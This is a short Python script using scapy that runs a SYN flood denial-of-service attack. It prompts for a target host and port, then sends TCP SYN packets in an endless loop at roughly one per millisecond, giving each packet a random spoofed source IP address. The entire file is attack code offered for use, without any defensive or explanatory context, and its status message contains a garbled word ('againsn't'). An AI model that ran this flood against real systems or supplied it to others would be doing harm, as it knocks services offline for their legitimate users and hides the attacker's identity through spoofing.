from scapy.all import *
import socket
import time

def randip():
    ip = []
    for _ in range(4):
        num = random.randrange(0, 256)
        ip.append(str(num))
    return ".".join(ip)

def main():
    try:
        host = input("Host: ")
        port = int(input("Port: "))
        host_ip = socket.gethostbyname(host)
        print(f"Initializing SSYN attack againsn't {host_ip}:{port}")
        packet = IP(dst=host_ip) / TCP(dport=port, flags="S", seq=RandShort(), ack=RandShort(), sport=RandShort())
        sent = 0
        while True:
            packet[IP].src = randip()
            send(packet, verbose=0)
            sent += 1
            print(f"Sent -> {sent}")
            time.sleep(1 / 1000)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
